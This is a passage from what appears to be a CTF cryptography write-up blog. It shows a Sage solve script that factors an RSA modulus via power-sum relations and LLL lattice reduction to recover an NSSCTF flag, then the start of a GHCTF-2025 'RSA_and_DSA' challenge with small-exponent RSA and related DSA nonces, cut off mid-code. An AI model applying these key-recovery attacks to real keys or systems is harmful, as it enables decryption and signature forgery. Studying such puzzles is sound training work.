class="number">28</span> - y^<span class="number">30</span> - <span class="number">2</span>*x^<span class="number">29</span> - x^<span class="number">28</span>*y + <span class="number">3</span>*x^<span class="number">26</span>*y^<span class="number">3</span> - x^<span class="number">25</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">5</span> + x^<span class="number">23</span>*y^<span class="number">6</span> - x^<span class="number">22</span>*y^<span class="number">7</span> - x^<span class="number">20</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">11</span> + x^<span class="number">16</span>*y^<span class="number">13</span> + x^<span class="number">15</span>*y^<span class="number">14</span> + x^<span class="number">14</span>*y^<span class="number">15</span> + x^<span class="number">13</span>*y^<span class="number">16</span> + x^<span class="number">12</span>*y^<span class="number">17</span> + <span class="number">5</span>*x^<span class="number">11</span>*y^<span class="number">18</span> - x^<span class="number">9</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">21</span> - <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">22</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">23</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">24</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">26</span> - x^<span class="number">2</span>*y^<span class="number">27</span> + <span class="number">2</span>*x*y^<span class="number">28</span> - y^<span class="number">29</span> + <span class="number">3</span>*x^<span class="number">28</span> + <span class="number">3</span>*x^<span class="number">27</span>*y - <span class="number">2</span>*x^<span class="number">26</span>*y^<span class="number">2</span> + x^<span class="number">25</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">4</span> - x^<span class="number">23</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">22</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">17</span>*y^<span class="number">11</span> - x^<span class="number">16</span>*y^<span class="number">12</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">14</span> + x^<span class="number">13</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">17</span> + x^<span class="number">10</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">19</span> + x^<span class="number">8</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">21</span> - x^<span class="number">6</span>*y^<span class="number">22</span> + x^<span class="number">5</span>*y^<span class="number">23</span> - x^<span class="number">4</span>*y^<span class="number">24</span> + x^<span class="number">3</span>*y^<span class="number">25</span> + x^<span class="number">2</span>*y^<span class="number">26</span> - x*y^<span class="number">27</span> - y^<span class="number">28</span> + x^<span class="number">27</span> + x^<span class="number">26</span>*y - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">3</span> + x^<span class="number">23</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">19</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">9</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">10</span> + x^<span class="number">16</span>*y^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">12</span> - <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">13</span> - x^<span class="number">13</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">16</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">9</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">21</span> + x^<span class="number">5</span>*y^<span class="number">22</span> + <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">25</span> + <span class="number">2</span>*x*y^<span class="number">26</span> - <span class="number">2</span>*y^<span class="number">27</span> + x^<span class="number">25</span>*y + x^<span class="number">24</span>*y^<span class="number">2</span> + x^<span class="number">23</span>*y^<span class="number">3</span> + <span class="number">5</span>*x^<span class="number">22</span>*y^<span class="number">4</span> + x^<span class="number">20</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">7</span> + x^<span class="number">18</span>*y^<span class="number">8</span> - x^<span class="number">17</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">11</span> - x^<span class="number">14</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">13</span> - x^<span class="number">12</span>*y^<span class="number">14</span> + <span class="number">4</span>*x^<span class="number">11</span>*y^<span class="number">15</span> - x^<span class="number">10</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">20</span> - x^<span class="number">5</span>*y^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">23</span> + x^<span class="number">2</span>*y^<span class="number">24</span> - <span class="number">3</span>*x*y^<span class="number">25</span> - <span class="number">3</span>*y^<span class="number">26</span> + <span class="number">3</span>*x^<span class="number">25</span> - <span class="number">2</span>*x^<span class="number">23</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">4</span> + x^<span class="number">17</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">9</span> - x^<span class="number">15</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">11</span> - x^<span class="number">13</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">14</span> - x^<span class="number">9</span>*y^<span class="number">16</span> - x^<span class="number">8</span>*y^<span class="number">17</span> - x^<span class="number">6</span>*y^<span class="number">19</span> - x^<span class="number">5</span>*y^<span class="number">20</span> + x^<span class="number">4</span>*y^<span class="number">21</span> + x^<span class="number">3</span>*y^<span class="number">22</span> + <span class="number">5</span>*x*y^<span class="number">24</span> - <span class="number">2</span>*y^<span class="number">25</span> - x^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">23</span>*y + x^<span class="number">22</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">3</span> - x^<span class="number">19</span>*y^<span class="number">5</span> + x^<span class="number">18</span>*y^<span class="number">6</span> - x^<span class="number">17</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">15</span>*y^<span class="number">9</span> - x^<span class="number">14</span>*y^<span class="number">10</span> - x^<span class="number">13</span>*y^<span class="number">11</span> - x^<span class="number">12</span>*y^<span class="number">12</span> + <span class="number">4</span>*x^<span class="number">10</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">15</span> - x^<span class="number">8</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">17</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">18</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">19</span> + x^<span class="number">4</span>*y^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">22</span> - <span class="number">5</span>*x*y^<span class="number">23</span> - y^<span class="number">24</span> + x^<span class="number">23</span> - x^<span class="number">22</span>*y + <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">2</span> - x^<span class="number">20</span>*y^<span class="number">3</span> - x^<span class="number">18</span>*y^<span class="number">5</span> - x^<span class="number">17</span>*y^<span class="number">6</span> - <span class="number">5</span>*x^<span class="number">15</span>*y^<span class="number">8</span> + x^<span class="number">14</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">13</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">12</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">12</span> - <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">14</span> - x^<span class="number">8</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">18</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">20</span> - x^<span class="number">2</span>*y^<span class="number">21</span> - x*y^<span class="number">22</span> - <span class="number">4</span>*y^<span class="number">23</span> - x^<span class="number">22</span> + <span class="number">2</span>*x^<span class="number">21</span>*y - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">17</span>*y^<span class="number">5</span> - x^<span class="number">16</span>*y^<span class="number">6</span> - x^<span class="number">15</span>*y^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">13</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">12</span> - x^<span class="number">9</span>*y^<span class="number">13</span> - x^<span class="number">7</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">19</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">20</span> + <span class="number">2</span>*x*y^<span class="number">21</span> + <span class="number">3</span>*y^<span class="number">22</span> - <span class="number">3</span>*x^<span class="number">21</span> - x^<span class="number">20</span>*y - x^<span class="number">19</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">4</span> - x^<span class="number">16</span>*y^<span class="number">5</span> - x^<span class="number">15</span>*y^<span class="number">6</span> + x^<span class="number">14</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">12</span>*y^<span class="number">9</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">10</span> + x^<span class="number">10</span>*y^<span class="number">11</span> + x^<span class="number">6</span>*y^<span class="number">15</span> + x^<span class="number">5</span>*y^<span class="number">16</span> + x^<span class="number">4</span>*y^<span class="number">17</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">19</span> - <span class="number">2</span>*x*y^<span class="number">20</span> - <span class="number">2</span>*y^<span class="number">21</span> + x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span>*y - <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">7</span> - x^<span class="number">12</span>*y^<span class="number">8</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">9</span> + x^<span class="number">10</span>*y^<span class="number">10</span> + <span class="number">6</span>*x^<span class="number">9</span>*y^<span class="number">11</span> + x^<span class="number">8</span>*y^<span class="number">12</span> + x^<span class="number">7</span>*y^<span class="number">13</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">15</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">17</span> - x^<span class="number">2</span>*y^<span class="number">18</span> + <span class="number">3</span>*x*y^<span class="number">19</span> - x^<span class="number">17</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">5</span> - x^<span class="number">13</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">8</span> + x^<span class="number">10</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">10</span> - x^<span class="number">7</span>*y^<span class="number">12</span> - x^<span class="number">6</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">15</span> + x^<span class="number">2</span>*y^<span class="number">17</span> + <span class="number">2</span>*y^<span class="number">19</span> - x^<span class="number">18</span> - x^<span class="number">16</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">10</span> + x^<span class="number">6</span>*y^<span class="number">12</span> - x^<span class="number">4</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">16</span> - <span class="number">2</span>*x*y^<span class="number">17</span> - x^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">16</span>*y - <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">3</span> - x^<span class="number">13</span>*y^<span class="number">4</span> + x^<span class="number">12</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">10</span>*y^<span class="number">7</span> - x^<span class="number">9</span>*y^<span class="number">8</span> - <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">11</span> - x^<span class="number">5</span>*y^<span class="number">12</span> + x^<span class="number">4</span>*y^<span class="number">13</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">15</span> + x*y^<span class="number">16</span> - <span class="number">3</span>*x^<span class="number">16</span> + x^<span class="number">15</span>*y - <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">2</span> - x^<span class="number">13</span>*y^<span class="number">3</span> - x^<span class="number">12</span>*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">5</span> - x^<span class="number">10</span>*y^<span class="number">6</span> + <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">7</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">11</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">13</span> + x^<span class="number">2</span>*y^<span class="number">14</span> - <span class="number">3</span>*x*y^<span class="number">15</span> - x^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">14</span>*y + x^<span class="number">13</span>*y^<span class="number">2</span> - x^<span class="number">12</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">4</span> + x^<span class="number">10</span>*y^<span class="number">5</span> - x^<span class="number">9</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">7</span> - x^<span class="number">7</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">4</span>*y^<span class="number">11</span> + x^<span class="number">3</span>*y^<span class="number">12</span> - x^<span class="number">14</span> + x^<span class="number">13</span>*y + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">2</span> + x^<span class="number">11</span>*y^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">10</span>*y^<span class="number">4</span> - x^<span class="number">9</span>*y^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">7</span> + x^<span class="number">6</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">9</span> + x^<span class="number">4</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">2</span>*y^<span class="number">12</span> - <span class="number">4</span>*x*y^<span class="number">13</span> + <span class="number">3</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">2</span> - x^<span class="number">9</span>*y^<span class="number">4</span> - x^<span class="number">8</span>*y^<span class="number">5</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">10</span> - x^<span class="number">2</span>*y^<span class="number">11</span> - <span class="number">2</span>*x*y^<span class="number">12</span> - <span class="number">3</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">12</span> + x^<span class="number">11</span>*y + x^<span class="number">10</span>*y^<span class="number">2</span> + x^<span class="number">9</span>*y^<span class="number">3</span> + x^<span class="number">8</span>*y^<span class="number">4</span> - x^<span class="number">6</span>*y^<span class="number">6</span> - x^<span class="number">5</span>*y^<span class="number">7</span> - <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">9</span> - x^<span class="number">2</span>*y^<span class="number">10</span> - <span class="number">3</span>*x*y^<span class="number">11</span> - <span class="number">2</span>*y^<span class="number">12</span> + x^<span class="number">10</span>*y + <span class="number">5</span>*x^<span class="number">9</span>*y^<span class="number">2</span> + x^<span class="number">8</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">6</span> + x^<span class="number">4</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">9</span> + <span class="number">2</span>*x*y^<span class="number">10</span> + <span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">9</span>*y - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">3</span> - x^<span class="number">6</span>*y^<span class="number">4</span> + x^<span class="number">5</span>*y^<span class="number">5</span> + <span class="number">3</span>*x^<span class="number">4</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">8</span> - x*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">8</span>*y - <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">3</span> + x^<span class="number">5</span>*y^<span class="number">4</span> - x^<span class="number">4</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">7</span> + x*y^<span class="number">8</span> + <span class="number">4</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - x^<span class="number">7</span>*y - <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">3</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">4</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">6</span> + <span class="number">2</span>*x*y^<span class="number">7</span> - <span class="number">2</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">2</span> + <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">5</span> - x*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span> + <span class="number">6</span>*x^<span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">4</span> - <span class="number">2</span>*x*y^<span class="number">5</span> - <span class="number">3</span>*y^<span class="number">6</span> + x^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">4</span>*y + x^<span class="number">3</span>*y^<span class="number">2</span> + x^<span class="number">2</span>*y^<span class="number">3</span> - <span class="number">2</span>*x*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">3</span>*y + <span class="number">6</span>*x^<span class="number">2</span>*y^<span class="number">2</span> - <span class="number">3</span>*x*y^<span class="number">3</span> - <span class="number">2</span>*y^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">2</span>*x^<span class="number">2</span>*y - <span class="number">2</span>*x*y^<span class="number">2</span> + <span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - x*y + y^<span class="number">2</span> - <span class="number">2</span>*x + <span class="number">2</span>*y - <span class="number">2</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line">c = <span class="number">10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line">need = [(-term[<span class="number">0</span>], term[<span class="number">1</span>].degree()) <span class="keyword">for</span> term <span class="keyword">in</span> f%(x-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">sumpow = [<span class="number">4</span>] <span class="comment"># sumpow[i] = pow(2,p**i+q**i,n)</span></span><br><span class="line">sumpow.append(<span class="built_in">pow</span>(<span class="number">2</span>,n+<span class="number">1</span>,n)) <span class="comment"># (p*q + 1)%(p*q - p - q + 1) == p + q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">32</span>):</span><br><span class="line">    sumpow.append(<span class="built_in">pow</span>(sumpow[i-<span class="number">1</span>],n+<span class="number">1</span>,n) * <span class="built_in">pow</span>(sumpow[i-<span class="number">2</span>],-n,n))</span><br><span class="line">    sumpow[-<span class="number">1</span>] %= n</span><br><span class="line">    <span class="comment"># p**i + q**i = (p + q)(p**(i-1) + q**(i-1)) - (p*q)(p**(i-2) + q**(i-2))</span></span><br><span class="line"></span><br><span class="line">f2 = f</span><br><span class="line">w2 = w</span><br><span class="line"><span class="keyword">for</span> coeff, deg <span class="keyword">in</span> need:</span><br><span class="line">    w2 *= <span class="built_in">pow</span>(sumpow[deg],coeff,n)</span><br><span class="line">    w2 %= n</span><br><span class="line">    f2 += coeff*(x**deg + y**deg)</span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f2%(x-<span class="number">1</span>)),n) * <span class="built_in">pow</span>(w2,-<span class="number">1</span>,n) - <span class="number">1</span>, n)</span><br><span class="line">prefix = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">length = <span class="number">88</span> - <span class="built_in">len</span>(prefix) - <span class="built_in">len</span>(suffix)</span><br><span class="line"></span><br><span class="line">c -= <span class="number">256</span>^(<span class="built_in">len</span>(suffix) + length) * bytes_to_long(prefix)</span><br><span class="line">c -= bytes_to_long(suffix)</span><br><span class="line">c = c * inverse(<span class="number">256</span>,p) % p</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^i</span><br><span class="line">    c -= <span class="number">256</span>^i*<span class="number">48</span></span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">4</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">L[:,-<span class="number">1</span>:] *= <span class="number">2</span>^<span class="number">512</span></span><br><span class="line">res = L.LLL()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(i[-<span class="number">2</span>]) == <span class="number">4</span> <span class="keyword">and</span> <span class="built_in">all</span>(<span class="built_in">abs</span>(j) &lt; <span class="number">10</span> <span class="keyword">for</span> j <span class="keyword">in</span> i)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="number">48</span> + <span class="built_in">abs</span>(j))</span><br><span class="line">flag = prefix+flag.encode()+suffix</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="RSA-and-DSA"><a href="#RSA-and-DSA" class="headerlink" title="RSA_and_DSA"></a>RSA_and_DSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">ink=getPrime(<span class="number">20</span>)</span><br><span class="line">p1= getPrime(<span class="number">512</span>)</span><br><span class="line">q1= getPrime(<span class="number">512</span>)</span><br><span class="line">N = p1* q1</span><br><span class="line">phi = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d1= getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d1, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d1, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">c_ink = <span class="built_in">pow</span>(ink, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_ink=&#x27;</span>,c_ink)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e=&#x27;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=&#x27;</span>,N)</span><br><span class="line"></span><br><span class="line">k= getPrime(<span class="number">64</span>)</span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * gmpy2.invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    temp = q * getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(temp + <span class="number">1</span>):</span><br><span class="line">        p = temp + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h, (p - <span class="number">1</span>) // q, p)</span><br><span class="line">y = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k+ink))</span><br><span class="line"><span 